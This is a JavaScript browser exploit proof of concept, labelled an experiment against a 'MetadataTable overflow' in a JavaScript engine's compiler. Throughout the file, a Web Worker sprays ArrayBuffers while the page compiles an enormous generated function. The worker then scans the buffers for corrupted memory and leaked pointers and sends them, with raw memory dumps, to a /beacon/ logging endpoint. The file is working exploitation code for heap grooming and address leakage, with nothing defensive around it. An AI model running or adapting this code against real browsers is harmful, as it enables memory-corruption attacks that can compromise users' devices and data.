// p150j — MetadataTable overflow: Worker concurrent spray during compilation
//
// Workers run on separate OS threads. While the main thread compiles
// the BIG function (~6s), a worker steadily sprays ABs via setInterval.
// Worker ABs interleave with compiler allocations in the shared heap.
// ABs allocated AFTER the metadata buffer are in the forward sweep range.
// finishCreation() writes code pointers through these ABs.
//
// Beacon prefix: V150J-
(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150J-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  var workerSrc = '(' + function() {
    var bufs = [];
    var views = [];
    var sprayTimer = null;
    var BUF_SIZE = 100096;

    function wb(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', '/beacon/V150J-W-' + tag + '?t=' + Date.now(), false);
        x.send();
      } catch(e) {}
    }

    onmessage = function(e) {
      if (e.data === 'start') {
        wb('GO');
        // Spray 3 ABs every 15ms across the ~6s compilation window
        sprayTimer = setInterval(function() {
          for (var i = 0; i < 3 && bufs.length < 2000; i++) {
            try {
              var ab = new ArrayBuffer(BUF_SIZE);
              bufs.push(ab);
              views.push(new Uint32Array(ab));
            } catch(ex) { break; }
          }
          if (bufs.length >= 2000) {
            clearInterval(sprayTimer);
            wb('FULL-' + bufs.length);
          }
        }, 15);
      }

      if (e.data === 'scan') {
        if (sprayTimer) clearInterval(sprayTimer);
        wb('SCAN-' + bufs.length);

        var hitBufs = 0, totalNZ = 0, reported = 0;
        for (var i = 0; i < bufs.length; i++) {
          var v = views[i];
          if (!v) continue;
          var nz = 0;
          for (var j = 0; j < v.length; j++) {
            if (v[j] !== 0) nz++;
          }
          if (nz > 0) {
            hitBufs++;
            totalNZ += nz;
            if (reported < 30) {
              var ct = 0;
              for (var k = 0; k < v.length && ct < 3; k++) {
                if (v[k] !== 0) {
                  wb('L-b' + i + '-o' + (k*4) + '-' + v[k].toString(16));
                  ct++; reported++;
                }
              }
            }
          }
        }
        wb('HITS-' + hitBufs + '-NZ-' + totalNZ);

        if (hitBufs > 0) {
          var ptrs = 0;
          for (var i = 0; i < bufs.length && ptrs < 10; i++) {
            var u8 = new Uint8Array(bufs[i]);
            for (var j = 0; j < u8.length - 7 && ptrs < 10; j += 8) {
              var hi = (u8[j+7] << 8) | u8[j+6];
              var mid = (u8[j+5] << 8) | u8[j+4];
              if (hi === 0 && mid !== 0) {
                var hex = '';
                for (var x = 7; x >= 0; x--) hex += ('0' + u8[j+x].toString(16)).slice(-2);
                wb('PTR-b' + i + '-o' + j + '-' + hex);
                ptrs++;
              }
            }
          }
          wb('PTRS-' + ptrs);

          // Dump first hit buffer's raw 112 bytes at first NZ position
          for (var i = 0; i < bufs.length; i++) {
            var v = views[i];
            var fst = -1;
            for (var j = 0; j < v.length; j++) {
              if (v[j] !== 0) { fst = j; break; }
            }
            if (fst < 0) continue;
            var d = '';
            for (var dd = 0; dd < 28 && (fst+dd) < v.length; dd++) {
              if (dd) d += ',';
              d += v[fst+dd].toString(16);
            }
            wb('DUMP-b' + i + '-o' + (fst*4) + '-' + d);
            break;
          }
        }

        postMessage({hits: hitBufs, nz: totalNZ});
        wb('DONE');
      }
    };
  }.toString() + ')();';

  var wBlob = new Blob([workerSrc], {type: 'application/javascript'});
  var wUrl = URL.createObjectURL(wBlob);
  var worker;
  try {
    worker = new Worker(wUrl);
  } catch(e) {
    BS('WORKER-ERR-' + (e.message || '').substring(0,30));
    return;
  }
  BS('WORKER-OK');

  worker.onmessage = function(e) {
    BS('RESULT-' + e.data.hits + 'h-' + e.data.nz + 'nz');
  };

  // Start worker spray BEFORE starting compilation
  worker.postMessage('start');

  // Build the BIG function
  var N = 38348816;
  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__bigFn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__bigOk=1;';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() {
    BS('SCRIPT-ERR');
    worker.postMessage('scan');
  };
  sc.onload = function() {
    blob = null;
    URL.revokeObjectURL(url);
    BS('COMPILED-' + (window.__bigOk ? 'OK' : 'FAIL'));
    // Tell worker to stop spraying and scan
    worker.postMessage('scan');
  };
  document.head.appendChild(sc);
  sc.src = url;
})();
